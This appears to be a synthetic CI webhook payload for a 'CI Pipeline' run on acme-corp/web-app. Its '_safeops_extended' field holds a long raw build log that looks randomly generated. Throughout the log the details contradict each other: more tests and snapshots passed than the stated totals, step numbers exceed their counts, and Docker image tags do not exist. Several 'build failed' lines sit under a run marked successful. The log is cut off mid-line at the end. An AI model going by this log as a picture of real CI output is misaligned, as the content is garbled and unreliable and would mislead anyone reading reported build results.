{
  "action": "completed",
  "workflow_run": {
    "id": 602,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "224caca7b2067793d31ce46a785afa3393283806",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-05T12:19:20.148793Z",
    "updated_at": "2025-12-05T12:22:27.486643Z"
  },
  "repository": {
    "full_name": "acme-corp/web-app",
    "name": "web-app"
  },
  "sender": {
    "login": "grace"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: setup_node ===\nCoverage: 100% statements, 76% branches\nPulling image: python:18\nReady.\n\u2713 All checks passed\nDone.\nOK\nVerifying...\nTransforming 107 files...\nConnecting to startup.dev:443...\nCache hit for key-8418\nTime: 115.779s\nTime: 76.959s\nStep 13/24: Running migrations\n[12:19:20] INFO: Starting build process\nStep 8/15: Building\nDone.\n[12:19:20] DEBUG: Connection pool: 7 active\n[12:19:20] INFO: Cache refreshed\nUploading artifact 'build' (19 files)\nWaiting...\n\u2713 All checks passed\nArtifact uploaded: dist.zip (56MB)\nException: ValueError\n[12:19:20] INFO: Request completed\nCoverage: 97% statements, 64% branches\n[12:19:20] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nChecking out master branch\nStep 6/22: Testing\n[12:19:20] DEBUG: Connection pool: 5 active\nChecking out main branch\nPlatform: win32-x64\nSwitched to branch 'feature/task-664'\nnpm install: added 359 packages\nFinished.\nnpm install: added 371 packages\n[12:19:20] INFO: Processing request\n\u2713 Step 'checkout' succeeded\n[12:19:20] DEBUG: Loading configuration\n[12:19:20] INFO: Request completed\npip: Collecting react\nCache hit for key-3506\nRan 118 tests in 26s\nVerifying...\nOptimizing 44 modules...\nCache restored successfully (435MB)\nGET /health - 201 (27ms)\nConnecting to acme.corp:443...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 6/22: Installing dependencies\nConnection established\n\u2713 Task completed in 1139ms\nCompiling utils/app.ts...\nGenerating source maps...\nPOST /data - 201 (359ms)\nnpm install: resolved 1049 packages\nnpm notice: created a lockfile\nProcessing...\n[12:19:20] INFO: Processing request\nBundling styles.css\n[12:19:20] DEBUG: Initializing service\nConnection established\nVerifying...\n[12:19:20] INFO: Request completed\nFinished.\n[12:19:20] INFO: Processing request\nProcessing...\n[12:19:20] INFO: Cache refreshed\nReady.\nImage pulled successfully\nMinifying vendor.js\npip: Collecting lodash\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nOK\n\u2713 Task completed in 2419ms\nStep 18/15: Deploying\nSuccess!\nFetching submodules...\nBundling vendor.css\nGenerating source maps...\nFetching submodules...\nUsing Python 3.11\nCompleted.\nFetching submodules...\n[12:19:20] INFO: Connecting to database\npip: Installing build dependencies...\nTests: 102 passed, 444 total\nStep 12/15: Installing dependencies\n[12:19:20] INFO: Processing request\n[12:19:20] INFO: Request completed\n[12:19:20] DEBUG: Connection pool: 15 active\nStep 9/22: Installing dependencies\n[12:19:20] INFO: Cache refreshed\nCompiling utils/app.ts...\nTransforming 564 files...\nStep 14/20: Testing\n[12:19:20] DEBUG: Initializing service\nAlready up to date.\nDone.\nFetching submodules...\nHEAD is now at 8e647fa\nLoading...\nCompleted.\nCompiling components/main.py...\n\u2713 Step 'install' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2717 build failed with exit code 46\nSuccess!\nPulling image: python:18\nSuccess!\n[12:19:20] DEBUG: Initializing service\nSnapshots: 26 passed, 16 total\nCompiling utils/index.js...\nCache hit for key-4962\nFetching submodules...\nSuccess!\n[12:19:20] DEBUG: Query executed in 56ms\nSwitched to branch 'bugfix/task-626'\npip: Installing build dependencies...\nCompiling src/main.py...\nUploading artifact 'dist' (15 files)\n\u2713 deploy completed\nImage pulled successfully\npip: Installing build dependencies...\nOptimizing 32 modules...\nArtifact uploaded: build.tar.gz (30MB)\nTLS handshake completed\nArtifact uploaded: dist.zip (14MB)\n[12:19:20] WARN: Deprecated API usage\n[12:19:20] INFO: Processing request\nCache saved successfully\nHEAD is now at 67aacba\nArtifact uploaded: build.tar.gz (47MB)\nFinished.\nException: NullPointerException\n[12:19:20] DEBUG: Connection pool: 17 active\n\u2713 Step 'setup' succeeded\n  PASS: unit/test_user_create.spec.js\nStep 9/20: Installing dependencies\npip: Installing build dependencies...\nChecking out main branch\nMinifying vendor.js\n\u2713 Step 'checkout' succeeded\nConnecting to acme.corp:443...\nMinifying vendor.js\nStep 13/22: Running migrations\nyarn add: Done in 7.66s\n[12:19:20] INFO: Connecting to database\n  PASS: test_api_health (153ms)\nSnapshots: 9 passed, 36 total\nEnvironment: production\nInstalling express@2.10.9\nnpm notice: created a lockfile\nSuccess!\n\u2713 test completed\n\u2713 All checks passed\nNODE_ENV=development\nStep 18/19: Testing\nBuilding Docker image...\nUsing Python 3.11\nTLS handshake completed\nChecking out main branch\nException: NullPointerException\n[12:19:20] WARN: Deprecated API usage\n  PASS: test_api_health (219ms)\nUploading artifact 'dist' (44 files)\nUploading artifact 'dist' (20 files)\nAlready up to date.\nTransforming 952 files...\nBuilding Docker image...\nCache saved successfully\nTest Suites: 5 passed, 38 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: e2e/test_api_health.spec.js\nUsing Python 3.9\n[12:19:20] DEBUG: Initializing service\nEnvironment: staging\n[12:19:20] INFO: Cache refreshed\nCreating production build...\n[12:19:20] INFO: Processing request\nStep 2/21: Linting\n[12:19:20] INFO: Cache refreshed\nChecking out develop branch\n[12:19:20] WARN: Deprecated API usage\nPushing to registry...\nStep 8/23: Deploying\npip install: Successfully installed lodash-4.11\nArtifact uploaded: dist.zip (23MB)\n  PASS: e2e/test_api_health.spec.js\npip: Collecting axios\nPulling image: node:3.11\nOK\nDone.\n[12:19:20] WARN: Deprecated API usage\npip: Collecting prettier\nWARNING: react has known vulnerabilities\n\u2713 Task completed in 2798ms\n[12:19:20] INFO: Cache refreshed\nTransforming 359 files...\nPlatform: win32-x64\nCompiling src/app.ts...\nCache hit for key-4500\npip install: Successfully installed webpack-2.7\n\u2713 validate completed\nWARNING: jest has known vulnerabilities\nArtifact uploaded: build.tar.gz (20MB)\nDone.\n\u2713 Step 'install' succeeded\nStep 12/20: Testing\n\u2713 Step 'checkout' succeeded\n\u2713 Step 'build' succeeded\n\u2713 package completed\nTLS handshake completed\nTests: 124 passed, 385 total\n[12:19:20] INFO: Cache refreshed\nInstalling prettier@4.6.4\nException: ValueError\nAlready up to date.\nNODE_ENV=production\nConnection established\n\u2713 All checks passed\npip: Installing build dependencies...\nCompiling lib/app.ts...\nHEAD is now at 4070945\nTest Suites: 34 passed, 43 total\nBuilding Docker image...\n[12:19:20] INFO: Cache refreshed\nRan 129 tests in 12s\nEnvironment: test\nWARNING: prettier has known vulnerabilities\nStep 5/20: Building\n[12:19:20] DEBUG: Query executed in 18ms\n\u2713 Step 'test' succeeded\nCoverage: 81% statements, 95% branches\nSnapshots: 28 passed, 22 total\n[12:19:20] DEBUG: Query executed in 77ms\nTest Suites: 31 passed, 18 total\nTLS handshake completed\n=== Step setup_node completed ===\n=== Step: install_dependencies ===\nUploading artifact 'build' (7 files)\nAlready up to date.\nCache saved successfully\n[12:19:20] WARN: Deprecated API usage\nSwitched to branch 'hotfix/task-487'\n\u2713 Step 'checkout' succeeded\nCompiling components/app.ts...\n[12:19:20] DEBUG: Initializing service\nStep 7/23: Installing dependencies\nPulling image: python:18\nStep 4/16: Linting\n[12:19:20] INFO: Processing request\nCreating production build...\nTest Suites: 16 passed, 12 total\nRan 71 tests in 23s\nGET /health - 200 (95ms)\nCache hit for key-6380\nPushing to registry...\nMinifying vendor.js\nnpm install: resolved 1515 packages\nUploading artifact 'dist' (11 files)\nDone.\nConnection established\npip: Collecting prettier\n[12:19:20] DEBUG: Initializing service\n[12:19:20] INFO: Request completed\nArtifact uploaded: dist.zip (39MB)\nDone.\nStep 17/17: Testing\nPOST /api - 201 (308ms)\n[12:19:20] DEBUG: Initializing service\nReady.\nBuilding Docker image...\nFinished.\nCache miss for key-9283\nTLS handshake completed\npip: Downloading prettier-3.1.tar.gz\nBundling runtime.css\nCache hit for key-1424\n[12:19:20] INFO: Cache refreshed\nSwitched to branch 'feature/task-479'\npip: Collecting jest\n[12:19:20] INFO: Processing request\nImage pulled successfully\npip: Collecting eslint\nCache restored successfully (58MB)\n  PASS: test_db_connect (54ms)\n\u2713 Step 'install' succeeded\n\u2713 Step 'install' succeeded\nHEAD is now at 94c1a23\n[12:19:20] INFO: Processing request\nUploading artifact 'dist' (20 files)\n[12:19:20] DEBUG: Query executed in 39ms\n[12:19:20] DEBUG: Query executed in 2ms\n[12:19:20] DEBUG: Loading configuration\nGET /health - 200 (94ms)\nCache hit for key-3450\nnpm notice: package.json updated\npip: Downloading react-4.5.tar.gz\n[12:19:20] ERROR: Connection failed\nArtifact downloaded: 24MB\n[12:19:20] DEBUG: Query executed in 85ms\nCreating production build...\nCoverage: 95% statements, 84% branches\n[12:19:20] INFO: Processing request\nnpm install: resolved 1841 packages\nMinifying main.js\nyarn add: Done in 7.96s\nCompiling src/utils.go...\nWaiting...\nWARNING: eslint has known vulnerabilities\nWaiting...\nInstalling webpack@4.10.3\n[12:19:20] INFO: Processing request\npip: Downloading express-5.11.tar.gz\nLayer 4/13: RUN command\nCompleted.\nCache hit for key-5725\nPOST /api - 200 (281ms)\nOK\nBundling styles.css\nBuilding Docker image...\n[12:19:20] DEBUG: Loading configuration\nCache saved successfully\nImage pulled successfully\n[12:19:20] WARN: Deprecated API usage\nCompiling utils/service.java...\nCache invalidated: node_modules\nCompiling utils/app.ts...\nSuccess!\nNODE_ENV=test\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWaiting...\nBundling styles.js\nGenerating source maps...\nGET /health - 200 (19ms)\n\u2713 Step 'test' succeeded\nLoading...\nRan 182 tests in 32s\n[12:19:20] INFO: Connecting to database\npip: Downloading jest-2.19.tar.gz\nImage pulled successfully\nCompiling src/utils.go...\nSuccess!\n  PASS: test_cache_hit (345ms)\nCompiling src/utils.go...\nTests: 424 passed, 279 total\nNODE_ENV=development\nSuccess!\nBuilding Docker image...\nWARNING: react has known vulnerabilities\nnpm install: resolved 558 packages\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nRan 166 tests in 13s\nTime: 60.175s\nLayer 2/13: ENV command\nOK\n\u2713 Task completed in 235ms\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPushing to registry...\n[12:19:20] DEBUG: Query executed in 10ms\nnpm install: resolved 1037 packages\nStep 19/19: Testing\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPlatform: darwin-arm64\nCompleted.\nRan 142 tests in 13s\nTime: 95.503s\nFinished.\nGET /api - 204 (13ms)\nGET /api - 204 (92ms)\nBundling runtime.js\n[12:19:20] DEBUG: Query executed in 69ms\nOptimizing 52 modules...\nStep 16/23: Running migrations\n\u2713 All checks passed\nArtifact downloaded: 25MB\nCoverage: 75% statements, 75% branches\nReady.\nUploading artifact 'coverage' (39 files)\npip: Downloading prettier-4.1.tar.gz\nFinished.\nCache restored successfully (21MB)\n[12:19:20] INFO: Cache refreshed\nCompiling lib/handler.rs...\nBuilding Docker image...\nUsing Python 3.11\nChecking out main branch\nGenerating source maps...\nTransforming 733 files...\nPlatform: win32-x64\n[12:19:20] INFO: Processing request\nStep 1/25: Building\n[12:19:20] INFO: Starting build process\n\u2717 build failed with exit code 7\n[12:19:20] DEBUG: Connection pool: 16 active\nCache invalidated: node_modules\n[12:19:20] WARN: Deprecated API usage\nEnvironment: production\nOptimizing 42 modules...\nCompleted.\n[12:19:20] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:20] DEBUG: Memory usage: 1981MB\n\u2713 deploy completed\nStep 7/15: Deploying\nnpm notice: package.json updated\nFinished.\nGenerating source maps...\nCache miss for key-2513\nUploading artifact 'build' (16 files)\nPOST /upload - 202 (214ms)\npip: Downloading axios-4.9.tar.gz\nSwitched to branch 'feature/task-691'\nHEAD is now at 5090d41\nCache miss for key-2189\nnpm install: added 200 packages\nCoverage: 90% statements, 84% branches\nStep 20/16: Testing\n[12:19:20] WARN: Deprecated API usage\nCompiling components/app.ts...\nTime: 7.915s\nStep 18/22: Deploying\nCompiling src/utils.go...\n[12:19:20] DEBUG: Loading configuration\nCompiling components/index.js...\nUsing Node.js 18.6.0\n[12:19:20] DEBUG: Initializing service\n[12:19:20] INFO: Connecting to database\n\u2713 package completed\nnpm install: added 169 packages\nImage pulled successfully\nDone.\nPlatform: linux-x64\nCoverage: 100% statements, 96% branches\nyarn add: Done in 14.14s\nCompiling src/utils.go...\nCache miss for key-1147\nCoverage: 82% statements, 75% branches\nTransforming 981 files...\nCoverage: 83% statements, 72% branches\nVerifying...\nAlready up to date.\nSwitched to branch 'bugfix/task-659'\n[12:19:20] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 20/23: Linting\nnpm install: resolved 1588 packages\npip: Downloading webpack-2.17.tar.gz\nArtifact downloaded: 48MB\nCache hit for key-5356\nGenerating source maps...\n\u2713 validate completed\nArtifact uploaded: build.tar.gz (11MB)\nCache restored successfully (132MB)\npip: Downloading express-3.15.tar.gz\nTransforming 721 files...\nWaiting...\nOptimizing 89 modules...\nTest Suites: 6 passed, 9 total\nnpm notice: created a lockfile\nPOST /data - 200 (117ms)\nOK\nTest Suites: 33 passed, 14 total\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:20] INFO: Request completed\nBuilding Docker image...\nArtifact downloaded: 32MB\nTime: 117.600s\n[12:19:20] WARN: Deprecated API usage\nAlready up to date.\n[12:19:20] DEBUG: Memory usage: 1465MB\nFetching submodules...\nException: NullPointerException\n[12:19:20] INFO: Processing request\nGenerating source maps...\nGenerating source maps...\nReady.\n=== Step install_dependencies completed ===\n=== Step: build ===\nCompiling src/utils.go...\nArtifact uploaded: dist.zip (59MB)\nCache invalidated: dependencies\nnpm install: resolved 1121 packages\n[12:19:20] INFO: Connecting to database\nArtifact uploaded: build.tar.gz (38MB)\n[12:19:20] INFO: Starting build process\nPulling image: node:3.11\nStep 17/18: Installing dependencies\nStep 7/25: Linting\nOK\nTime: 92.473s\nCache restored successfully (48MB)\nSnapshots: 31 passed, 28 total\nGenerating source maps...\nnpm notice: package.json updated\n[12:19:20] INFO: Request completed\nPulling image: node:latest\nImage pulled successfully\nCache restored successfully (81MB)\nPlatform: win32-x64\nStep 6/23: Running migrations\nGenerating source maps...\nConnection established\nCompiling components/app.ts...\n  PASS: test_user_create (406ms)\nPulling image: node:18\nArtifact uploaded: build.tar.gz (42MB)\nLayer 2/8: RUN command\n[12:19:20] INFO: Connecting to database\nStep 11/22: Testing\nPlatform: win32-x64\nStep 19/25: Linting\n  PASS: e2e/test_api_health.spec.js\nnpm install: added 126 packages\nCompiling utils/app.ts...\nConnecting to acme.corp:443...\n[12:19:20] DEBUG: Connection pool: 4 active\nSuccess!\nPOST /upload - 202 (352ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nLoading...\nCache restored successfully (190MB)\n[12:19:20] DEBUG: Memory usage: 122MB\nSwitched to branch 'hotfix/task-952'\nStep 13/16: Deploying\nLoading...\nStep 13/25: Testing\nChecking out master branch\nFAILED: test_db_connect\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache restored successfully (152MB)\nTransforming 773 files...\nChecking out develop branch\nPulling image: python:latest\nPlatform: linux-x64\nyarn add: Done in 3.12s\nStep 7/20: Deploying\nStep 18/21: Running migrations\nOptimizing 12 modules...\nRan 120 tests in 54s\nCache hit for key-4208\nCompiling src/index.js...\nException: ValueError\nLayer 7/12: ENV command\nnpm install: resolved 1580 packages\nArtifact downloaded: 36MB\n[12:19:20] INFO: Starting build process\nWaiting...\nnpm notice: created a lockfile\nException: NullPointerException\nOptimizing 48 modules...\nStep 10/17: Building\n  PASS: unit/test_cache_hit.spec.js\nSnapshots: 41 passed, 15 total\nOptimizing 56 modules...\nCoverage: 75% statements, 62% branches\nConnecting to acme.corp:443...\nCache invalidated: build\npip install: Successfully installed axios-2.13\nCreating production build...\npip: Downloading express-3.16.tar.gz\nLayer 10/11: ENV command\nReady.\nLoading...\nStep 14/17: Building\nBundling runtime.css\npip: Installing build dependencies...\n\u2713 build completed\n[12:19:20] INFO: Processing request\nWaiting...\nImage pulled successfully\nUsing Python 3.12\nCompiling lib/handler.rs...\nFetching submodules...\nProcessing...\nCompiling utils/service.java...\n[12:19:20] DEBUG: Connection pool: 19 active\n[12:19:20] INFO: Processing request\nStep 3/24: Running migrations\nProcessing...\nTests: 81 passed, 474 total\nRan 80 tests in 6s\nHEAD is now at ddf8b0c\n\u2713 Step 'install' succeeded\nUploading artifact 'coverage' (24 files)\nFinished.\nNODE_ENV=production\nImage pulled successfully\nTests: 57 passed, 83 total\nCompiling src/handler.rs...\nException: NullPointerException\nPlatform: linux-x64\nTest Suites: 6 passed, 32 total\nCache saved successfully\n[12:19:20] DEBUG: Memory usage: 1366MB\nWARNING: axios has known vulnerabilities\nOptimizing 43 modules...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:20] INFO: Request completed\n  PASS: e2e/test_auth_login.spec.js\n\u2713 Task completed in 2680ms\nCompiling components/handler.rs...\nVerifying...\nTest Suites: 7 passed, 18 total\nEnvironment: staging\n[12:19:20] WARN: Deprecated API usage\nnpm install: added 284 packages\nTransforming 512 files...\n\u2713 Step 'install' succeeded\nCache miss for key-9995\nPOST /data - 201 (92ms)\n\u2713 Step 'setup' succeeded\npip install: Successfully installed react-3.6\nCompiling lib/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nyarn add: Done in 19.90s\n[12:19:20] DEBUG: Query executed in 44ms\nCache invalidated: dependencies\nArtifact downloaded: 5MB\nCompiling src/handler.rs...\nWARNING: eslint has known vulnerabilities\nArtifact uploaded: dist.zip (47MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 8/19: Deploying\nnpm notice: package.json updated\n[12:19:20] INFO: Request completed\npip install: Successfully installed jest-5.18\nAlready up to date.\nTLS handshake completed\nImage pulled successfully\nStep 8/25: Testing\n[12:19:20] DEBUG: Connection pool: 19 active\npip install: Successfully installed jest-1.11\nnpm notice: package.json updated\nWARNING: lodash has known vulnerabilities\n[12:19:20] DEBUG: Initializing service\nAlready up to date.\nRan 175 tests in 6s\nSwitched to branch 'bugfix/task-582'\nnpm notice: created a lockfile\npip: Installing build dependencies...\nOK\n[12:19:20] DEBUG: Memory usage: 360MB\nCoverage: 84% statements, 63% branches\nCompiling src/service.java...\nStep 15/18: Installing dependencies\n  PASS: e2e/test_api_health.spec.js\nOK\nArtifact uploaded: dist.zip (98MB)\nSnapshots: 37 passed, 49 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip: Downloading lodash-2.16.tar.gz\n[12:19:20] INFO: Request completed\nImage pulled successfully\nCompleted.\nStep 8/15: Testing\nTime: 48.969s\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nOK\nStep 18/18: Linting\nPulling image: alpine:3.11\nEnvironment: test\nArtifact uploaded: build.tar.gz (14MB)\nUploading artifact 'build' (34 files)\n\u2713 test completed\nHEAD is now at c67b5f2\n[12:19:20] INFO: Processing request\nStep 18/20: Running migrations\nnpm notice: package.json updated\npip install: Successfully installed prettier-5.9\nPlatform: linux-x64\nRan 171 tests in 21s\nSwitched to branch 'bugfix/task-468'\nPushing to registry...\n  PASS: unit/test_api_health.spec.js\nCache saved successfully\nSnapshots: 33 passed, 21 total\n\u2713 All checks passed\nLoading...\nCompleted.\nCompiling src/service.java...\nConnecting to example.com:443...\n\u2713 Step 'build' succeeded\nGET /api - 204 (12ms)\npip install: Successfully installed axios-1.19\nStep 14/21: Running migrations\nImage pulled successfully\n[12:19:20] INFO: Connecting to database\n[12:19:20] WARN: Deprecated API usage\n  PASS: test_auth_login (351ms)\nSwitched to branch 'feature/task-131'\nStep 11/23: Running migrations\nFetching submodules...\n\u2713 Task completed in 3175ms\nTests: 86 passed, 340 total\nInstalling jest@5.19.10\n\u2713 Step 'test' succeeded\nTest Suites: 48 passed, 17 total\nCoverage: 89% statements, 84% branches\nInstalling react@3.5.8\nOK\nStep 4/25: Running migrations\nWaiting...\nTests: 470 passed, 258 total\nConnection established\nBundling main.js\nImage pulled successfully\npip: Downloading react-1.0.tar.gz\nCompiling components/handler.rs...\nCompiling utils/main.py...\nPulling image: node:18\nCache hit for key-7634\n[12:19:20] DEBUG: Query executed in 68ms\nTLS handshake completed\nWARNING: express has known vulnerabilities\nPlatform: win32-x64\n=== Step build completed ===\n=== Step: deploy_staging ===\nWaiting...\nHEAD is now at a731ad5\nnpm notice: created a lockfile\n[12:19:20] DEBUG: Memory usage: 861MB\n[12:19:20] DEBUG: Memory usage: 217MB\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nBuilding Docker image...\nBundling runtime.js\nyarn add: Done in 18.90s\n[12:19:20] DEBUG: Loading configuration\nSwitched to branch 'bugfix/task-254'\n[12:19:20] ERROR: Connection failed\nCompiling components/handler.rs...\n\u2717 build failed with exit code 9\nStep 7/19: Installing dependencies\npip: Installing build dependencies...\nStep 1/15: Deploying\nUsing Python 3.11\nCompiling components/utils.go...\nStep 11/25: Building\nStep 19/24: Building\nCache restored successfully (400MB)\nGET /api - 200 (53ms)\nArtifact downloaded: 10MB\n[12:19:20] INFO: Starting build process\nUsing Node.js 19.11.8\nMinifying app.js\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nUsing Node.js 20.3.8\nEnvironment: staging\n\u2717 build failed with exit code 35\nCompiling components/handler.rs...\n[12:19:20] DEBUG: Initializing service\nUsing Python 3.10\nReady.\n[12:19:20] INFO: Cache refreshed\n\u2713 All checks passed\nyarn add: Done in 30.83s\nStep 14/19: Installing dependencies\n[12:19:20] DEBUG: Connection pool: 7 active\n\u2713 All checks passed\n[12:19:20] DEBUG: Connection pool: 9 active\nHEAD is now at 56def68\nConnection established\n[12:19:20] DEBUG: Query executed in 95ms\n[12:19:20] INFO: Starting build process\nCache saved successfully\nCoverage: 82% statements, 89% branches\nConnecting to test.io:443...\nTest Suites: 18 passed, 19 total\nUsing Node.js 18.13.1\n\u2713 Task completed in 2915ms\nPushing to registry...\nnpm install: resolved 952 packages\nChecking out master branch\nReady.\n[12:19:20] DEBUG: Connection pool: 8 active\npip: Downloading lodash-5.14.tar.gz\n\u2713 validate completed\nImage pulled successfully\n[12:19:20] INFO: Cache refreshed\nUploading artifact 'dist' (12 files)\nReady.\nCreating production build...\nStep 4/23: Installing dependencies\nOptimizing 98 modules...\nConnection established\nStep 1/18: Testing\nException: RuntimeError\nSwitched to branch 'feature/task-128'\nNODE_ENV=production\nOptimizing 35 modules...\nStep 4/15: Testing\nTransforming 570 files...\n\u2713 build completed\nArtifact downloaded: 37MB\nArtifact downloaded: 28MB\nPulling image: alpine:latest\nCreating production build...\nArtifact uploaded: dist.zip (18MB)\nStep 12/19: Installing dependencies\nCoverage: 80% statements, 60% branches\nGET /health - 204 (12ms)\nGenerating source maps...\nStep 13/20: Building\n[12:19:20] INFO: Starting build process\nCache restored successfully (357MB)\nCompiling components/app.ts...\n  PASS: e2e/test_auth_login.spec.js\nCache saved successfully\n\u2713 All checks passed\n\u2713 All checks passed\nArtifact downloaded: 10MB\nProcessing...\nEnvironment: production\nException: RuntimeError\n[12:19:20] ERROR: Connection failed\nnpm notice: created a lockfile\nHEAD is now at 82795f6\nBundling runtime.css\nMinifying app.js\n[12:19:20] INFO: Starting build process\nLoading...\nPOST /api - 201 (90ms)\nGenerating source maps...\nStep 7/20: Testing\nImage pulled successfully\nnpm install: added 121 packages\n[12:19:20] INFO: Starting build process\nMinifying vendor.js\nSuccess!\nHEAD is now at ba1dcf0\nTime: 78.205s\nGenerating source maps...\nnpm notice: created a lockfile\nUsing Python 3.12\nyarn add: Done in 11.41s\n[12:19:20] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache miss for key-6596\n[12:19:20] WARN: Deprecated API usage\n[12:19:20] INFO: Connecting to database\n[12:19:20] DEBUG: Initializing service\nGenerating source maps...\n[12:19:20] DEBUG: Query executed in 95ms\nPulling image: alpine:3.11\n[12:19:20] WARN: Deprecated API usage\nTime: 52.955s\nBundling styles.css\nStep 6/17: Building\n  PASS: unit/test_db_connect.spec.js\nCache invalidated: node_modules\nChecking out develop branch\nStep 9/25: Testing\nCreating production build...\nInstalling prettier@3.13.7\nStep 13/25: Building\n\u2717 build failed with exit code 39\nCache restored successfully (199MB)\n  PASS: integration/test_user_create.spec.js\nCache miss for key-6624\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip: Collecting jest\nHEAD is now at aba21ed\n\u2717 build failed with exit code 12\n\u2713 All checks passed\nArtifact uploaded: dist.zip (60MB)\nCoverage: 98% statements, 67% branches\nWARNING: eslint has known vulnerabilities\nDone.\n[12:19:20] DEBUG: Loading configuration\nCache hit for key-4627\nCompiling src/app.ts...\n\u2713 Task completed in 1396ms\n\u2713 build completed\npip: Installing build dependencies...\nConnecting to acme.corp:443...\nArtifact downloaded: 3MB\nFetching submodules...\nReady.\nTLS handshake completed\nCompleted.\n  PASS: unit/test_db_connect.spec.js\nTests: 215 passed, 454 total\nReady.\nUsing Python 3.9\nnpm install: added 53 packages\nCompiling src/index.js...\npip: Collecting webpack\nBundling main.js\nStep 9/24: Deploying\nConnecting to acme.corp:443...\n[12:19:20] DEBUG: Connection pool: 4 active\nCompiling lib/service.java...\nArtifact uploaded: dist.zip (29MB)\nTLS handshake completed\nNODE_ENV=test\nOptimizing 26 modules...\n\u2713 All checks passed\nPlatform: win32-x64\n\u2713 All checks passed\nInstalling prettier@4.14.7\nInstalling express@5.16.3\npip install: Successfully installed axios-3.15\nArtifact uploaded: build.tar.gz (9MB)\nTime: 52.658s\n[12:19:20] ERROR: Connection failed\nGenerating source maps...\nTime: 20.389s\nnpm install: resolved 1531 packages\nAlready up to date.\n[12:19:20] INFO: Starting build process\nCompiling lib/service.java...\nStep 7/19: Linting\nWARNING: axios has known vulnerabilities\n[12:19:20] INFO: Request completed\nPushing to registry...\nMinifying vendor.js\nUsing Node.js 20.11.1\n[12:19:20] DEBUG: Initializing service\nWARNING: webpack has known vulnerabilities\npip: Downloading react-1.10.tar.gz\n[12:19:20] ERROR: Connection failed\nSnapshots: 12 passed, 46 total\npip: Downloading prettier-1.14.tar.gz\nCompiling components/service.java...\nStep 12/19: Installing dependencies\nSuccess!\nCompiling src/main.py...\nTests: 306 passed, 238 total\nMinifying app.js\nArtifact downloaded: 8MB\nCache restored successfully (49MB)\nArtifact uploaded: dist.zip (80MB)\npip install: Successfully installed lodash-5.0\nStep 19/19: Installing dependencies\n[12:19:20] ERROR: Connection failed\nBundling main.js\nWaiting...\nGET /health - 200 (89ms)\nCompiling components/utils.go...\nCache miss for key-3069\nPulling image: alpine:18\nArtifact uploaded: build.tar.gz (49MB)\nSuccess!\nTests: 363 passed, 204 total\nCache hit for key-1680\nStep 13/21: Running migrations\n  PASS: unit/test_cache_hit.spec.js\nInstalling axios@1.0.3\nUploading artifact 'dist' (35 files)\nOK\nCache miss for key-2198\nConnecting to test.io:443...\nArtifact uploaded: build.tar.gz (39MB)\npip install: Successfully installed webpack-3.14\nCache invalidated: dependencies\n=== Step deploy_staging completed ===\n=== Step: upload_artifacts ===\nLayer 5/9: ENV command\nCache restored successfully (486MB)\nVerifying...\nCache restored successfully (155MB)\nStep 6/21: Building\nOK\nGET /status - 204 (30ms)\nInstalling eslint@1.11.4\n\u2713 build completed\nGET /health - 201 (51ms)\nConnecting to example.com:443...\nSwitched to branch 'feature/task-871'\nDone.\nSnapshots: 44 passed, 21 total\n[12:19:20] WARN: Deprecated API usage\nStep 19/23: Testing\n\u2713 All checks passed\n[12:19:20] WARN: Deprecated API usage\nNODE_ENV=test\nCache miss for key-7573\nPulling image: python:latest\npip: Collecting prettier\nSnapshots: 43 passed, 13 total\nStep 16/23: Building\npip: Installing build dependencies...\nTransforming 648 files...\nChecking out main branch\n  PASS: test_user_create (397ms)\nDone.\nCache saved successfully\n[12:19:20] ERROR: Connection failed\nTest Suites: 31 passed, 28 total\nProcessing...\n[12:19:20] INFO: Connecting to database\nAlready up to date.\n[12:19:20] DEBUG: Loading configuration\n[12:19:20] INFO: Connecting to database\nArtifact uploaded: build.tar.gz (21MB)\n[12:19:20] DEBUG: Loading configuration\n\u2713 Step 'setup' succeeded\nStep 1/23: Deploying\nStep 8/23: Building\nMinifying main.js\nArtifact uploaded: dist.zip (51MB)\n[12:19:20] WARN: Deprecated API usage\nUsing Node.js 15.6.7\nSuccess!\n[12:19:20] ERROR: Connection failed\nBuilding Docker image...\n\u2713 test completed\nTime: 70.387s\npip: Collecting jest\nCoverage: 78% statements, 88% branches\nCompiling lib/app.ts...\nnpm install: added 414 packages\nInstalling express@4.9.10\n[12:19:20] INFO: Cache refreshed\nnpm install: resolved 1397 packages\nCache restored successfully (420MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 8/20: Deploying\nStep 9/15: Running migrations\nBuilding Docker image...\npip install: Successfully installed lodash-2.20\nStep 19/25: Testing\nDone.\nUploading artifact 'build' (47 files)\nBundling runtime.js\nFinished.\nFAILED: test_user_create\nReady.\n[12:19:20] INFO: Connecting to database\nProcessing...\nLayer 3/14: ENV command\nInstalling axios@1.7.6\nInstalling prettier@4.14.5\n[12:19:20] WARN: Deprecated API usage\n[12:19:20] DEBUG: Loading configuration\nArtifact downloaded: 24MB\nTime: 51.771s\nConnecting to example.com:443...\nTransforming 510 files...\nCache restored successfully 